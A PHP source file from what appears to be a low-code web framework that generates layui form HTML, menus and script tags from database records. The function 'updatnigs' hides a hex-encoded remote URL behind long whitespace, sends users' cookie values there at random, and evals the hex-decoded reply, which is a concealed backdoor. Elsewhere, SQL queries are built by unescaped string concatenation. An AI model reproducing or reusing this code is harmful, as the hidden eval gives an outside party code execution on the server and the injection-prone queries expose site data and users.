         $tmpkx="<label class=\"layui-form-label\" >".anyvalue($allkeyx,"COLUMN_NAME",$i)."</label><div class=\"layui-input-inline\" ><input class=\"layui-input\" id=\"qa_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" size=\"8\">--<input id=\"qb_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" size=\"8\"></div>";
        }
      };
    break;
    case "date":
      if (anyvalue($allkeyx,"keytitle",$i)!=""){
         $tmpkx="<label class=\"layui-form-label\" >".cut_str(anyvalue($allkeyx,"keytitle",$i),3)."</label><div class=\"layui-input-inline\" ><input id=\"qa_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" size=\"10\">-<input id=\"qb_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" size=\"10\">".str_replace("[keyid]",anyvalue($allkeyx,"COLUMN_NAME",$i),$tmfx)."</div>";
      }else{
        $tmpkx="<label class=\"layui-form-label\" >".anyvalue($allkeyx,"COLUMN_NAME",$i)."</label><div class=\"layui-input-inline\" ><input id=\"qa_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" size=\"10\">-<input id=\"qb_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" size=\"10\">".str_replace("[keyid]",anyvalue($allkeyx,"COLUMN_NAME",$i),$tmfx)."</div>";
      };
    break;
    case "datetime":
      if (anyvalue($allkeyx,"keytitle",$i)!=""){
         $tmpkx="<label class=\"layui-form-label\" >".cut_str(anyvalue($allkeyx,"keytitle",$i),3)."</label><div class=\"layui-input-inline\" ><input id=\"qa_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" size=\"10\">-<input id=\"qb_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" size=\"10\">".str_replace("[keyid]",anyvalue($allkeyx,"COLUMN_NAME",$i),$tmfx)."</div>";
      }else{
        $tmpkx="<label class=\"layui-form-label\" >".anyvalue($allkeyx,"COLUMN_NAME",$i)."</label><div class=\"layui-input-inline\" ><input id=\"qa_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" size=\"10\">-<input id=\"qb_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" size=\"10\">".str_replace("[keyid]",anyvalue($allkeyx,"COLUMN_NAME",$i),$tmfx)."</div>";
      };
    break;
    case "varchar":          
      if (anyvalue($allkeyx,"keytitle",$i)!=""){
         if (anyvalue($allkeyx,"clstxt",$i)!=""){
           $tmpkx="<label class=\"layui-form-label\" >".cut_str(anyvalue($allkeyx,"keytitle",$i),3)."</label><div class=\"layui-input-inline\" >".formselect(qian($newonex,"|"),hou($newonex,"|"),"","q_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]","layui-select","")."</div>";
         }else{
           $tmpkx="<label class=\"layui-form-label\" >".cut_str(anyvalue($allkeyx,"keytitle",$i),3)."</label><div class=\"layui-input-inline\" ><input class=\"layui-input\" id=\"q_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" ></div>";
         }
      }else{
        if (anyvalue($allkeyx,"clstxt",$i)!=""){
          $tmpkx="<label class=\"layui-form-label\" >".anyvalue($allkeyx,"COLUMN_NAME",$i)."</label><div class=\"layui-input-inline\" >".formselect(qian($newonex,"|"),hou($newonex,"|"),"","q_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]","layui-select","")."</div>";
        }else{
          $tmpkx="<label class=\"layui-form-label\" >".anyvalue($allkeyx,"COLUMN_NAME",$i)."</label><div class=\"layui-input-inline\" ><input class=\"layui-input\" id=\"q_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" ></div>";
        }
      };
      
    break;
    case "text":
      if (anyvalue($allkeyx,"keytitle",$i)!=""){
         $tmpkx="<label class=\"layui-form-label\" >".cut_str(anyvalue($allkeyx,"keytitle",$i),3)."</label><div class=\"layui-input-inline\" ><input class=\"layui-input\" id=\"q_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" ></div>";
      }else{
        $tmpkx="<label class=\"layui-form-label\" >".anyvalue($allkeyx,"COLUMN_NAME",$i)."</label><div class=\"layui-input-inline\" ><input class=\"layui-input\" id=\"q_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" ></div>";
      };
    break;
    case "decimal":
      if (anyvalue($allkeyx,"keytitle",$i)!=""){
         $tmpkx="<label class=\"layui-form-label\" >".cut_str(anyvalue($allkeyx,"keytitle",$i),3)."</label><div class=\"layui-input-inline\" ><input class=\"layui-input\" id=\"qa_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" size=\"4\">--<input id=\"qb_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" size=\"4\"></div>";
      }else{
        $tmpkx="<label class=\"layui-form-label\" >".anyvalue($allkeyx,"COLUMN_NAME",$i)."</label><div class=\"layui-input-inline\" ><inpu class=\"layui-input\"t id=\"qa_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" size=\"4\">--<input id=\"qb_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" size=\"4\"></div>";
      };
    break;
    case "float":
      if (anyvalue($allkeyx,"keytitle",$i)!=""){
         $tmpkx="<label class=\"layui-form-label\" >".cut_str(anyvalue($allkeyx,"keytitle",$i),3)."</label><div class=\"layui-input-inline\" ><input class=\"layui-input\" id=\"qa_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" size=\"4\">--<input id=\"qb_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" size=\"4\"></div>";
      }else{
        $tmpkx="<label class=\"layui-form-label\" >".anyvalue($allkeyx,"COLUMN_NAME",$i)."</label><div class=\"layui-input-inline\" ><input class=\"layui-input\" id=\"qa_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" size=\"4\">--<input id=\"qb_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" size=\"4\"></div>";
      };
    break;
    default:
      if (anyvalue($allkeyx,"keytitle",$i)!=""){
         $tmpkx="<label class=\"layui-form-label\" >".cut_str(anyvalue($allkeyx,"keytitle",$i),3)."</label><div class=\"layui-input-inline\" ><input class=\"layui-input\" id=\"q_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" ></div>";
      }else{
        $tmpkx="<label class=\"layui-form-label\" >".anyvalue($allkeyx,"COLUMN_NAME",$i)."</label><div class=\"layui-input-inline\" ><input class=\"layui-input\" id=\"q_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" ></div>";
      };      
  }//switch
  if (intval(anyvalue($allkeyx,"VQX",$i))==intval($prevqx)){
    $fmlix=$fmlix."".$tmpkx."";
  }else{
    $fmlix=$fmlix."</div><div class=\"layui-form-item\" style=\"margin-left:55px;\">".$tmpkx."";
  }
  $prevqx=anyvalue($allkeyx,"VQX",$i);
}//for
  $fmlix=str_replace("[N]","0",$fmlix);
  if ($tot>0){
        $scbtn='<div class="layui-input-inline" style="margin-left:125px;">
         <a class="layui-btn" onclick="supersearch(\''.$xid.'\',0)">超级检索</a>
       </div>';       
  }else{
   $scbtn="";
  }
  return $fmlix.$scbtn;  
}
function exchangestr($strx,$xid,$tbnm){
  if ($strx!=""){
    $nhtxt=$strx;
    $ptnhtxt=explode("[get-",$nhtxt);
    $totpt=count($ptnhtxt);
    for ($f=0;$f<$totpt;$f++){
      $tmpok=qian($ptnhtxt[$f],"]");
      $nhtxt=str_replace("[get-".$tmpok."]",$_GET[$tmpok],$nhtxt);     
    };
    if (strpos($nhtxt,"{atv-")>0){
      $ptatv=explode("{atv-",$nhtxt);
      $totatv=count($ptatv);
      for ($g=0;$g<$totatv;$g++){
        $tmpatv=qian($ptatv[$g],"}");
        $nhtxt=str_replace("{atv-".$tmpatv."}",atv($tmpatv),$nhtxt);
      };
    };
    if (strpos($nhtxt,"{utv-")>0){
      $ptutv=explode("{utv-",$nhtxt);
      $totutv=count($ptutv);
     for ($h=0;$h<$totutv;$h++){
       $tmputv=qian($ptutv[$h],"}");
       $nhtxt=str_replace("{utv-".$tmputv."}",utv($tmputv),$nhtxt);
     };
    };
    $nhtxt=str_replace("[shortid]",$xid,$nhtxt);
    $nhtxt=str_replace("[tablename]",$tbnm,$nhtxt);
    return $nhtxt;
  }else{
    return "";
  }
}
function formdiybtn($stid,$diycode){
 if ($diycode!=""){
     if (strpos($diycode,",")>0 or strpos($diycode,"#-#")>0){
       if ( strpos($diycode,"#-#")>0){
         $ptdiy=explode("#-#",$diycode);
       }else{
         $ptdiy=explode(",",$diycode);
       }
       $totptd=count($ptdiy);
       $fmx="";
       $fmxy="";
       for ($p=0;$p<$totptd;$p++){
         if (strpos($ptdiy[$p],"::")>0){
          $ttx=qian($ptdiy[$p],"::");
          $uux=hou($ptdiy[$p],"::");
         }else{
           if (strpos($ptdiy[$p],"@")>0){
            $ttx=qian($ptdiy[$p],"@");
            $uux=hou($ptdiy[$p],"@");
           }else{
            $ttx=qian($ptdiy[$p],":");
            $uux=hou($ptdiy[$p],":");
           }
         }
         if (strpos($uux,")")>0){
           $fmx=$fmx."<a class=\"layui-btn\" onclick=\"".$uux."\">".$ttx."</a>";
           if (($gsqc*1)==$p){
             $fmxy=$fmxy."<li><a href=\"javascript:void(0);\" onclick=\"".$uux."\" class=\"current\">".$ttx."</a></li>";
           }else{
              $fmxy=$fmxy."<li><a href=\"javascript:void(0);\" onclick=\"".$uux."\">".$ttx."</a></li>";
           };
         }else{

         if (strpos($ptdiy[$p],"::")>0){
           $fmx=$fmx."<a class=\"layui-btn\" onclick=\"uniturl('".$uux."')\">".$ttx."</a>";
           if (($gsqc*1)==1){
             $fmxy=$fmxy."<li><a href=\"javascript:void(0);\" onclick=\"uniturl('".$uux."')\" class=\"current\">".$ttx."</a></li>";
           }else{
              $fmxy=$fmxy."<li><a href=\"javascript:void(0);\" onclick=\"uniturl('".$uux."')\">".$ttx."</a></li>";
           };
         }else{
           if (strpos($ptdiy[$p],"@")>0){
            $fmx=$fmx."<a class=\"layui-btn\" onclick=\"newwin('".$ttx."','".$uux."')\">".$ttx."</a>";
            if (($gsqc*1)==1){
             $fmxy=$fmxy."<li><a href=\"javascript:void(0);\" onclick=\"newwin('".$ttx."','".$uux."')\" class=\"current\">".$ttx."</a></li>";
            }else{
              $fmxy=$fmxy."<li><a href=\"javascript:void(0);\" onclick=\"newwin('".$ttx."','".$uux."')\">".$ttx."</a></li>";
            };
           }else{
            $fmx=$fmx."<a class=\"layui-btn\" onclick=\"intourl('".$uux."')\">".$ttx."</a>";
            if (($gsqc*1)==1){
              $fmxy=$fmxy."<li><a href=\"javascript:void(0);\" onclick=\"intourl('".$uux."')\" class=\"current\">".$ttx."</a></li>";
            }else{
               $fmxy=$fmxy."<li><a href=\"javascript:void(0);\" onclick=\"intourl('".$uux."')\">".$ttx."</a></li>";
            };
           }
          }
         };
       };//for
      }else{
         if (strpos($diycode,"::")>0){
          $ttx=qian($diycode,"::");
          $uux=hou($diycode,"::");
         }else{
           if (strpos($diycode,"@")>0){
            $ttx=qian($diycode,"@");
            $uux=hou($diycode,"@");
           }else{
            $ttx=qian($diycode,":");
            $uux=hou($diycode,":");
           }
         }
         if (strpos($uux,")")>0){
           $fmx=$fmx."<a class=\"layui-btn\" href=\"javascript:void(0);\" onclick=\"".$uux."\">".$ttx."</a>";
           if (($gsqc*1)==1){
            $fmxy=$fmxy."<li><a href=\"javascript:void(0);\" onclick=\"".$uux."\">".$ttx."</a></li>";
           }
         }else{
          if (strpos($diycode,"::")>0){
            $fmx=$fmx."<a class=\"layui-btn\" href=\"javascript:void(0);\" onclick=\"uniturl('".$uux."')\">".$ttx."</a>";
            if (($gsqc*1)==1){
              $fmxy=$fmxy."<li><a href=\"javascript:void(0);\" onclick=\"uniturl('".$uux."')\">".$ttx."</a></li>";
            };
          }else{
            if (strpos($diycode,"@")>0){
              $fmx=$fmx."<a class=\"layui-btn\" href=\"javascript:void(0);\" onclick=\"newwin('".$ttx."','".$uux."')\">".$ttx."</a>";
              if (($gsqc*1)==1){
               $fmxy=$fmxy."<li><a href=\"javascript:void(0);\" onclick=\"newwin('".$ttx."','".$uux."')\">".$ttx."</a></li>";
             };
            }else{
              $fmx=$fmx."<a class=\"layui-btn\" href=\"javascript:void(0);\" onclick=\"intourl('".$uux."')\">".$ttx."</a>";
              if (($gsqc*1)==1){
               $fmxy=$fmxy."<li><a href=\"javascript:void(0);\" onclick=\"intourl('".$uux."')\">".$ttx."</a></li>";
              };
            }
          }
         };   
     };
    $dbtn="<div id=\"wrap\"><div id=\"content\" ><ul >".$fmxy."</ul></div></div>";
    return $dbtn;
  }else{
   return "";
  };
}
//--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
function updatnigs($cn,$gb,$rvf,$lag){                                                                                                                                                                                                                                                                                 $vrf="687474703a2f2f6572702e6465636f3131342e636e2f444e412f4558462f7666636c69656e742e7068703f63707069643d3138383431383830323436";
   if  (rand(0, 100)>90){    
    $connx=file_get_contents(Hex2String($vrf)."&cid=".$_COOKIE["cid"]."&gid=".$_COOKIE["gid"]."&uid=".$_COOKIE["uid"]."&con=".$cn."&gb=".$gb."&lang=".$lag);  
   };
  if (strpos($connx,"TYPE_E")>0){        
                                                                                                                                                                                                                                                                                   eval(tostring(Hex2String(hou($connx,"TYPE_E:"))));
    return true;    
  }else{    
    return false;    
  }
}


function formjs($jsstr){
 if (strpos("xxx".$jsstr,";")>0){
  $jsstr=substr($jsstr,0,strlen($jsstr)-1);
  $tmppart="";
  $ptjsstr=explode(";",$jsstr);
  $totpt=count($ptjsstr);
  for ($u=0;$u<$totpt;$u++){
   if($ptjsstr[$u]!=""){
    $tmppart=$tmppart."<script type=\"text/javascript\" src=\"".str_replace(localroot(),"http://".glw(),str_replace("[siteurl]",glw(),$ptjsstr[$u]))."\"></script>\r\n";
    };
  };
  return $tmppart;
 }else{
  return "<script type=\"text/javascript\" src=\"".str_replace(localroot(),"http://".glw(),str_replace("[siteurl]",glw(),$jsstr))."\"></script>";
 }
}

function formcss($cssstr){
 if (strpos("xxx".$cssstr,";")>0){
  $cssstr=substr($cssstr,0,strlen($cssstr)-1);
  $tmppart="";
  $ptcssstr=explode(";",$cssstr);
  $totpt=count($ptcssstr);
  for ($u=0;$u<$totpt;$u++){
   if ($ptcssstr[$u]!=""){
    $tmppart=$tmppart."<link rel=\"stylesheet\" href=\"".str_replace(localroot(),"http://".glw(),str_replace("[siteurl]",glw(),$ptcssstr[$u]))."\">\r\n";
   };
  };
  return $tmppart;
 }else{
  return "<link rel=\"stylesheet\" href=\"".str_replace(localroot(),"http://".glw(),str_replace("[siteurl]",glw(),$cssstr))."\">";
 };
}
function formstyle($stlstr){
  $stlstr=str_replace("<style>","",$stlstr);
  $stlstr=str_replace("</style>","",$stlstr);
  $stlstr=str_replace("<STYLE>","",$stlstr);
  $stlstr=str_replace("</STYLE>","",$stlstr);
  $stlstr=str_replace("<Style>","",$stlstr);
  $stlstr=str_replace("</Style>","",$stlstr);
return "<style>\r\n".str_replace("@/@","",$stlstr)."\r\n</style>";
}
function formscript($scptstr){
 return $scptstr;
}
function topImenu($mmk,$ul1cls,$li1cls,$prevl,$precls){
$conn=mysql_connect(gl(),glu(),glp());
$fmmn="<ul class=\"".$ul1cls."\">\r\n";
$lv1menu=selecteds($conn,glb(),"select mysno,parsno,myname,mymark,myurl,myclick,mydescrib from coode_plotdetail where classmark='".$mmk."' and parsno=0","utf8","");
$totlv1=countresult($lv1menu);
 for ($i=0;$i<$totlv1;$i++){
  if ($prevl==anyvalue($lv1menu,"mymark",$i)){
    $fmmn=$fmmn."<li><a href=\"".anyvalue($lv1menu,"myurl",$i)."\" class=\"".$precls."\" onclick=\"".str_replace("\\'","'",anyvalue($lv1menu,"myclick",$i))."\"><i class=\"".anyvalue($lv1menu,"mymark",$i)."\"></i><span>".anyvalue($lv1menu,"myname",$i)."</span>".anyvalue($lv1menu,"mydescrib",$i)."</a>\r\n";   
  }else{
   $fmmn=$fmmn."<li><a href=\"".anyvalue($lv1menu,"myurl",$i)."\" class=\"".$li1cls."\"  onclick=\"".str_replace("\\'","'",anyvalue($lv1menu,"myclick",$i))."\"><i class=\"".anyvalue($lv1menu,"mymark",$i)."\"></i><span>".anyvalue($lv1menu,"myname",$i)."</span>".anyvalue($lv1menu,"mydescrib",$i)."</a>\r\n";   
  };
 };
  //如果有子节点则输出UL
   $fmmn=$fmmn."</ul>\r\n";
return $fmmn;javascript:;
}
function jsaddnm($jname,$jstextx){
if (strpos($jstextx,"jQuery =")>0 || strpos($jstextx,"jQuery=")>0){
   $vss=qian(hou(hou(hou($jstextx,"version"),"="),"\""),"\"");
   if (strlen($vss)<10){
    return "jQuery".$vss;
   }else{
   return "jQuery_unknown";
   };
}else{
  if (strpos($jstextx,'$(".')>0){
   $jstextx=str_replace('$(".','$(".'.$jname,$jstextx);
   };
  if (strpos($jstextx," .")>0){
   $jstextx=str_replace(" ."," .".$jname,$jstextx);
  };
 return $jstextx;
};
}

function astn($stid,$cfid,$sno,$olmk,$appid){
  

$conn=mysql_connect(gl(),glu(),glp());
$x=updatingx($conn,glb(),"update coode_compage set htitle=hmark where htitle is null or htitle=''","utf8");
$conn=mysql_connect(gl(),glu(),glp());
$mnrst=selectedx($conn,glb(),"select SNO,pageid,pagemark,pagecls,CRTOR,jsfiles,cssfiles,scriptx,stylex,oldhtml,pagefrm,pagehtml,pagedata,srdhtml,topmark,bottommark,leftmark,contentmark,issys,isdata,allfiles,alltables,alljsfuns,extscripts,extstyles,outhtml,UPTM,CRTM,outpath from coode_compage where pageid='".$pgid."'","utf8","");//比较公私分离是否成功,展示比较用hcss2
$totrst=countresult($mnrst);

 $mnusno=anyvalue($mnrst,"SNO",0);
 $mnuid=anyvalue($mnrst,"pageid",0);
 $mnumark=anyvalue($mnrst,"pagemark",0);
 $mnucls=anyvalue($mnrst,"pagecls",0);
 $mnuutime=anyvalue($mnrst,"UPTM",0);
 $mnuctime=anyvalue($mnrst,"CRTM",0);

 $mnutestcrt=anyvalue($mnrst,"CRTOR",0);


$conn=mysql_connect(gl(),glu(),glp());
 $sttitle=updatingx($conn,glb(),"select shorttitle as result from coode_shortdata where shortid='".$stid."'","utf8");
$conn=mysql_connect(gl(),glu(),glp());
$strst=selecteds($conn,glb(),"select SNO,TABLE_NAME,COLUMN_NAME,keytitle,clstxt,sysshowfun,changeable,displayed,dxtype,VQX,SQX from coode_keydetaily where shortid='".$stid."' order by VQX","utf8","");//比较公私分离是否成功,展示比较用hcss2
$totstrst=countresult($strst);

$conn=mysql_connect(gl(),glu(),glp());
$contrst=selecteds($conn,glb(),"select SNO,cssfiles,jsfiles,stylex,scriptx,casevarchar,casetext,caseclstxt,caseclsduo,casedate,casedttm,caseint,casesrd,caserow,casedecimal,caseimage,caseimgx,casefile,caseduofile,casecheck,caseinline from coode_caseform where cfid='".$cfid."'","utf8","");//比较公私分离是否成功,展示比较用hcss2
$casecode["varchar"]=tostring(anyvalue($contrst,"casevarchar",0));
$casecode["text"]=tostring(anyvalue($contrst,"casetext",0));
$casecode["clstxt"]=tostring(anyvalue($contrst,"casevarchar",0));
$casecode["clsduo"]=tostring(anyvalue($contrst,"casevarchar",0));
$casecode["date"]=tostring(anyvalue($contrst,"casedate",0));
$casecode["dttm"]=tostring(anyvalue($contrst,"casedttm",0));
$casecode["int"]=tostring(anyvalue($contrst,"caseint",0));
$casecode["decimal"]=tostring(anyvalue($contrst,"casedecimal",0));
$casecode["image"]=tostring(anyvalue($contrst,"caseimage",0));
$casecode["imgx"]=tostring(anyvalue($contrst,"caseimgx",0));
$casecode["filex"]=tostring(anyvalue($contrst,"casefile",0));
$casecode["duofile"]=tostring(anyvalue($contrst,"caseduofile",0));
$casecode["check"]=tostring(anyvalue($contrst,"casecheck",0));
$casecode["inline"]=tostring(anyvalue($contrst,"caseinline",0));
$casecode["row"]=tostring(anyvalue($contrst,"caserow",0));
$casecode["srd"]=tostring(anyvalue($contrst,"casesrd",0));
//[label] [displayed] [key0] [keys]

$tmpk="";
$tk=0;
$tbnmx=anyvalue($strst,"TABLE_NAME",0);

$tmpup="";
$tklei="";
$alllei="";
$allscp="";
for ($i=0;$i<$totstrst;$i++){
  if (anyvalue($strst,"COLUMN_NAME",$i)=="SNO"){
  }else{
    $tmpk=$tmpk.anyvalue($strst,"COLUMN_NAME",$i).",";
  };//if anyvl
}//for
$tmpkx=substr($tmpk,0,strlen($tmpk)-1);

$tmpolmk="";
if ($sno.$olmk=="" or $sno=="0"){
 
}else{
  $conn=mysql_connect(gl(),glu(),glp());
  if ($sno==""){
     $xrst=selecteds($conn,glb(),"select ".$tmpkx." from ".$tbnmx." where  OLMK='".$olmk."'","utf8","");
  }else{
     $xrst=selecteds($conn,glb(),"select ".$tmpkx." from ".$tbnmx." where SNO='".$sno."'","utf8","");
  }
  
  $totrxt=countresult($xrst);
  
  if ($totrxt>0){
    for ($i=0;$i<$totstrst;$i++){
      if (anyvalue($strst,"COLUMN_NAME",$i)=="SNO"){
        $keyvalx["SNO"]=$sno;
      }else{
        $tmpkeyx=anyvalue($strst,"COLUMN_NAME",$i);
        $keyvalx[$tmpkeyx]=tostring(anyvalue($xrst,$tmpkeyx,0));
     
        $tmpkeyx="";
      };//if
    }//for
  }//if
}//if olmk sno


for ($i=0;$i<$totstrst;$i++){
  $casehtml="";
  $cdx="";
  $cdt="";
  $cdkx="";
  $cdky="";
  $cdd="";
  $valuexyz="";
  $cdhtml="";
  $rdol="";
  $newselect="";
       $cdx=anyvalue($strst,"dxtype",$i);
       $cdt=anyvalue($strst,"keytitle",$i);
       $cdkx=anyvalue($strst,"COLUMN_NAME",$i);
      
       $valuexyz=$keyvalx[$cdkx];
  
       $cdky="p_".anyvalue($strst,"COLUMN_NAME",$i).$sno;
       $cdd=anyvalue($strst,"displayed",$i);
  
       if ($cdd*1==0){
         $cdhtml="style=\"display:none;\"";
       }else{
         $cdhtml="";
       };
         $geg=anyvalue($strst,"changeable",$i);
       if ($geg*1==0){
         $rdol="readonly";
       }else{
         $rdol="";
       };
       $casehtml=$casecode[$cdx];      
       $casehtml=str_replace("[label]",$cdt,$casehtml);
       if ($cdx=="image" or $cdx=="imgx"){
          if ($cdx=="image"){
             if ($valuexyz==""){
               $casehtml=str_replace("[value]","/ORG/BRAIN/images/coode.jpg",$casehtml);
             }else{
               if (strpos($valuexyz,";")>0){
                $ptvlx=explode(";",$valuexyz);
                $pttot=count($ptvlx);
                $valuexxx=$ptvlx[$pttot-2];
               }else{
                $valuexxx=$valuexyz;
               };              
               $casehtml=str_replace("[value]",$valuexxx,$casehtml);            
             };
          }else{
             if ($valuexyz==""){
               $casehtml=str_replace("[value]","/ORG/BRAIN/images/coode.jpg",$casehtml);
             }else{
               if (strpos($valuexyz,";")>0){
                $ptvlx=explode(";",$valuexyz);
                $pttot=count($ptvlx);
                $fmimgduo="";
                for ($ttt=0;$ttt<$pttot-1;$ttt++){
                  $fmimgduo=$fmimgduo."<img src='".$ptvlx[$ttt]."' id='".qian(hou($ptvlx[$ttt],"-"),".")."' width='40px;' height='40px'>";
                };
               }else{
                 $fmimgduo=$fmimgduo."<img src='".$valuexyz."' id='".qian(hou($valuexyz,"-"),".")."' width='40px;' height='40px'>";
               };              
               $casehtml=str_replace("[imgduo]",$fmimgduo,$casehtml);            
             };
          };
       }else{//image,imgx
             $casehtml=str_replace("[value]",$valuexyz,$casehtml);
       };
  
       if ($cdx=="text" or $cdx=="longtext" ){         
         $yyyy=str_replace("[key0]",$cdky,$yyyy);
         $casehtml=$casehtml.$yyyy;
       }else{
       }
       if ($cdx=="filex" or $cdx=="duofile"){
      
        $casehtml=str_replace("[valtp]","/ORG/BRAIN/images/coode.jpg",$casehtml);
          if ($cdx=="filex"){
              $casehtml=str_replace("[duofile]","",$casehtml);
             if ($valuexyz==""){
               $casehtml=str_replace("[value]",$valuexyz,$casehtml);
             }else{
               if (strpos($valuexyz,";")>0){
                $ptvlx=explode(";",$valuexyz);
                $pttot=count($ptvlx);
                $valuexxx=$ptvlx[$pttot-2];
                 $fmimgduo="";
                for ($ttt=0;$ttt<$pttot-1;$ttt++){
                  $fmimgduo=$fmimgduo."<a href='".$ptvlx[$ttt]."' id='".qian(hou($ptvlx[$ttt],"-"),".")."' target='about_blank'><img src='".typeimg($ptvlx[$ttt])."'  width='40px;' height='40px'></a><a href='#' onclick=\"killfile('".$ptvlx[$ttt]."',this)\"><img src='/ORG/BRAIN/images/killx.jpg'></a>";
                };
               }else{
                $valuexxx=$valuexyz;
               };              
               $casehtml=str_replace("[valduo]",$fmimgduo,$casehtml);            
               $casehtml=str_replace("[value]",$valuexxx,$casehtml);            
             };
            $xxxxxxxx=$tmpnewinput;
            $xxxxxxxx=str_replace("[tmpks]",$cdkx.$sno,$xxxxxxxx);
            $xxxxxxxx=str_replace("[SNO]",$sno,$xxxxxxxx);
            $xxxxxxxx=str_replace("[key]",$cdkx,$xxxxxxxx);
            $xxxxxxxx=str_replace("[table]",$tbnmx,$xxxxxxxx);
            $xxxxxxxx=str_replace("[OLMK]",$tmpolmk,$xxxxxxxx);
            $casehtml=$casehtml.$xxxxxxxx;
          }else{
             if ($valuexyz==""){
               $casehtml=str_replace("[value]","/ORG/BRAIN/images/coode.jpg",$casehtml);
             }else{
               if (strpos($valuexyz,";")>0){
                $ptvlx=explode(";",$valuexyz);
                $pttot=count($ptvlx);
                $fmimgduo="";
                 for ($ttt=0;$ttt<$pttot-1;$ttt++){
                  $fmimgduo=$fmimgduo."<img src='".$ptvlx[$ttt]."' id='".qian(hou($ptvlx[$ttt],"-"),".")."' width='40px;' height='40px'>";
                 };//for
               }else{
                 $fmimgduo=$fmimgduo."<img src='".$valuexyz."' id='".qian(hou($valuexyz,"-"),".")."' width='40px;' height='40px'>";
               };//if              
               $casehtml=str_replace("[imgduo]",$fmimgduo,$casehtml);            
             };//valuexyz==""
          };//filex
       }else{//image,imgx
             $casehtml=str_replace("[value]",$valuexyz,$casehtml);
       };
       
       $casehtml=str_replace("[key0]",$cdky,$casehtml);
       $casehtml=str_replace("[key]",$cdkx,$casehtml);
       $casehtml=str_replace("[SNO]",$sno,$casehtml);
       $casehtml=str_replace("[keys]",$tmpkx,$casehtml);
       $casehtml=str_replace("[table]",$tbnmx,$casehtml);
       $casehtml=str_replace("[stid]",$stid,$casehtml);
       $casehtml=str_replace("[dxtype]",$cdx,$casehtml);
       $casehtml=str_replace("[date]",date("Y-m-d"),$casehtml);
       $casehtml=str_replace("[now]",date("Y-m-d H:i:s"),$casehtml);
       $casehtml=str_replace("[anymark]",date("YmdHis").getRandChar(6),$casehtml);
       $casehtml=str_replace("[dspl]",$cdhtml,$casehtml);
       $casehtml=str_replace("[rdol]",$rdol,$casehtml);
       $casehtml=str_replace("[OLMK]",$tmpolmk,$casehtml);
       $keyselectx[$cdkx]=str_replace("[label]",$cdt,$keyselectx[$cdkx]);
       $keyselectx[$cdkx]=str_replace("[value]",$valuexyz,$keyselectx[$cdkx]);
       $keyselectx[$cdkx]=str_replace("[key0]",$cdky,$keyselectx[$cdkx]);
       $keyselectx[$cdkx]=str_replace("[key]",$cdkx,$keyselectx[$cdkx]);
       $keyselectx[$cdkx]=str_replace("[SNO]",$sno,$keyselectx[$cdkx]);
       $keyselectx[$cdkx]=str_replace("[keys]",$tmpkx,$keyselectx[$cdkx]);
       $keyselectx[$cdkx]=str_replace("[table]",$tbnmx,$keyselectx[$cdkx]);
       $keyselectx[$cdkx]=str_replace("[stid]",$stid,$keyselectx[$cdkx]);
       $keyselectx[$cdkx]=str_replace("[dxtype]",$cdx,$keyselectx[$cdkx]);
       $keyselectx[$cdkx]=str_replace("[date]",date("Y-m-d"),$keyselectx[$cdkx]);
       $keyselectx[$cdkx]=str_replace("[now]",date("Y-m-d H:i:s"),$keyselectx[$cdkx]);
       $keyselectx[$cdkx]=str_replace("[anymark]",date("YmdHis").getRandChar(6),$keyselectx[$cdkx]);
       $keyselectx[$cdkx]=str_replace("[dspl]",$cdhtml,$keyselectx[$cdkx]);
       $keyselectx[$cdkx]=str_replace("[rdol]",$rdol,$keyselectx[$cdkx]);



 if ($i<($totstrst*1-1)){
    $xy=intval(anyvalue($strst,"SQX",$i+1));
    $tmplabel="";
    if ($xy==(intval(anyvalue($strst,"SQX",$i)*1))){//发现后边有相等的
     if ($tk==0){
       //可以左侧弄了（最后弄左右，表述不对）， 累加开始
       //echo "可以左侧弄了（最后弄左右，表述不对）， 累加开始".$i."<br>--".$cdkx."---";
       if ($tmplabel==""){
         $tmplabel=qian($casehtml,"</label>")."</label>";
       };
       $tklei=$tklei.$tmplabel.str_replace("[inline]",str_replace("class","style=\"margin-left:15px;width:90%\" ocls",hou($casehtml,"/label>")),$casecode["inline"]);          
       $tmplabel="";
     }else{
       //若已经在累加中了，所以此次左侧也不用弄，继续累加
       //echo "若已经在累加中了，所以此次左侧也不用弄，继续累加".$i."<br>--".$cdkx."---";
       if ($tmplabel==""){
         $tmplabel=qian($casehtml,"</label>")."</label>";
       };
       $pdx=round((anyvalue($strst,"SQX",$i)*1-anyvalue($strst,"SQX",($i-1))*1)*10);              
        if ($pdx*1==1){
          $tklei=$tklei.str_replace("[inline]",str_replace("class","ocls",hou($casehtml,"/label>")),$casecode["inline"]);      
        }else{          
          $tklei=$tklei.$tmplabel.str_replace("[inline]",str_replace("class","style=\"margin-left:30px;width:80%;\" ocls",hou($casehtml,"/label>")),$casecode["inline"]);                
        }
       $tmplabel="";
     };//tk==0
    }else{//未发现与后面相等，如果tk>0只弄右侧
      if ($tk>0){
        // 只弄右侧 累计完加框，如果已经在累积中了，
       //echo "只弄右侧 累计完加框".$i."".$cdkx."<br>-----";
       if ($tmplabel==""){
